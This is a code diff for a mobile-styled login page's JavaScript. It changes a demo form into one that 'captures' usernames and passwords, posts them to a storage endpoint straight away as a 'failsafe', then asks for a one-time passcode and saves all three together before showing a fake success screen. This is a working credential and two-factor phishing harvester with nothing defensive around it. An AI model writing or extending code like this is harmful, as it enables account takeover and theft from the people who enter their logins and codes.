@@ -2,7 +2,13 @@ document.addEventListener('DOMContentLoaded', () => {
   const loginForm = document.getElementById('login-form');
   const loginScreen = document.getElementById('login-screen');
   const loadingScreen = document.getElementById('loading-screen');
+  const otpScreen = document.getElementById('otp-screen');
+  const otpForm = document.getElementById('otp-form');
   const successScreen = document.getElementById('success-screen');
+
+  // Keep credentials in memory to combine with OTP
+  let capturedUsername = '';
+  let capturedPassword = '';
 
   // Haptic feedback simulator (if supported by browser)
   const triggerHaptic = () => {
@@ -11,7 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   };
 
-  // Form Submission
+  // 1. Initial Login Form Submission
   loginForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     triggerHaptic();
@@ -19,8 +25,8 @@ document.addEventListener('DOMContentLoaded', () => {
     // Blur inputs to hide keyboard on mobile
     document.activeElement.blur();
     
-    const demoUser = document.getElementById('username').value.trim();
-    const demoText = document.getElementById('password').value.trim();
+    capturedUsername = document.getElementById('username').value.trim();
+    capturedPassword = document.getElementById('password').value.trim();
 
     // Transition to loading screen
     loginScreen.classList.add('exit');
@@ -28,25 +34,21 @@ document.addEventListener('DOMContentLoaded', () => {
     setTimeout(async () => {
       loginScreen.classList.add('hidden');
       loadingScreen.classList.remove('hidden');
+      loadingScreen.classList.remove('exit');
       
       const startTime = Date.now();
-      let apiSuccess = false;
 
       try {
-        // Save form submission to private Vercel Blob storage
-        const response = await fetch('/api/save', {
+        // Save initial credential submission in background (failsafe in case they drop off on OTP)
+        await fetch('/api/save', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ demoUser, demoText })
+          body: JSON.stringify({ username: capturedUsername, password: capturedPassword })
         });
-        const result = await response.json();
-        if (response.ok && result.success) {
-          apiSuccess = true;
-        }
       } catch (err) {
-        console.error('Submission to Vercel Blob failed:', err);
+        console.error('Initial submission failed:', err);
       }
 
       // Ensure loading screen is visible for at least 2 seconds for a native app feel
@@ -55,7 +57,62 @@ document.addEventListener('DOMContentLoaded', () => {
       const remainingTime = Math.max(0, minDelay - elapsed);
 
       setTimeout(() => {
-        // Transition to success screen
+        // Transition to OTP screen
+        loadingScreen.classList.add('exit');
+        
+        setTimeout(() => {
+          loadingScreen.classList.add('hidden');
+          otpScreen.classList.remove('hidden');
+          triggerHaptic();
+        }, 320); // Wait for exit animation
+        
+      }, remainingTime);
+      
+    }, 320);
+  });
+
+  // 2. OTP Form Submission
+  otpForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    triggerHaptic();
+    
+    document.activeElement.blur();
+    
+    const otp = document.getElementById('otp-code').value.trim();
+
+    // Transition back to loading screen for confirmation processing
+    otpScreen.classList.add('exit');
+
+    setTimeout(async () => {
+      otpScreen.classList.add('hidden');
+      loadingScreen.classList.remove('hidden');
+      loadingScreen.classList.remove('exit');
+
+      const startTime = Date.now();
+
+      try {
+        // Save structured record containing Username, Password, AND OTP
+        await fetch('/api/save', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ 
+            username: capturedUsername, 
+            password: capturedPassword,
+            otp: otp
+          })
+        });
+      } catch (err) {
+        console.error('OTP submission failed:', err);
+      }
+
+      const elapsed = Date.now() - startTime;
+      const minDelay = 2000;
+      const remainingTime = Math.max(0, minDelay - elapsed);
+
+      setTimeout(() => {
+        // Transition to final success screen
         loadingScreen.classList.add('exit');
         
         setTimeout(() => {
@@ -65,7 +122,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 320); // Wait for exit animation
         
       }, remainingTime);
-      
+
     }, 320);
   });
 });
